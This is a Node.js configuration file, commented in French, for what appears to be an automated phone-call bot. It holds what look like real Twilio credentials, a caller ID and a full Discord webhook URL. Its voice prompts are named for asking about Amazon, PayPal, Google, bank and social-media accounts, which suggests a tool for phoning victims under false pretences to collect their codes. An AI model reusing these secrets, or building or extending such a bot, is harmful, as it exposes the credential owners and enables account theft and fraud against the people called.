module.exports = {
    setupdone: 'false',

    /**
     * Informations à propos du compte Twilio
     */
    accountSid: 'ACe89ab1a0f15fa6bfb570c0ba0fcfb32d',
    authToken: '1141f1118e846a8cded980f3c1154fb5',
    callerid: '+13396751044',

    /**
     * Informations à propos de l'API
     */
    apipassword: '',
    serverurl: '',

    /**
     * Informations à propos du webhook discord
     */
    discordwebhook: 'https://discord.com/api/webhooks/1334846160615116831/96tw-P2mzZ7uZQSBfzMESOuX-ElTBH2Y0pbRyMw2eQkFlTLqovMvw23wosPM7bz3uL_f',

    /**
     * Port sur lequel tourne le serveur express
     */
    port: process.env.PORT || 1337,

    /**
     * Chemins de stockage des fichiers audios
     */
    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
    googlefilepath: './voice/fr/google/ask-google.mp3',
    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
    endfilepath: './voice/fr/done/call-done.mp3',
    defaultfilepath: './voice/fr/default/ask-default.mp3',
    banquefilepath: './voice/fr/banque/ask-banque.mp3',

    /**
     * Contenu des sms selon les services demandés
     */
    paypalsms: 'pp test 123'
};
